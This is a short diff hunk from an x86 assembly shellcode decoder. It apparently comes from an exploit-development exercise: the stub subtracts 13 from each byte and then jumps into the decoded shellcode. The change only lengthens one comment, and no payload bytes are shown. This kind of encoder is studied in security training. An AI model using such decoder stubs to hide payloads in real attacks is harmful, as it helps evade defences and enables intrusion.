@@ -24,7 +24,7 @@ _start:
     sub byte [esi], 13         ; Get original shellcode by subtracting 13
     jz Shellcode               ; Break condition hits when we get 0 and transfer execution flow to decoded shellcode 
     inc esi                    ; Increment ESI to decode each and every byte
-    jmp short decoder_loop     ; Run decoder_loop on every byte till we get 0 on subtracting
+    jmp short decoder_loop     ; Run decoder_loop on every byte till we get 0 on subtracting indicating end of shellcode
 
     call_decoder:              ; CALL section
     call initiate_decoder      ; Goto initiate_decoder function to put the shellcode onto the stack
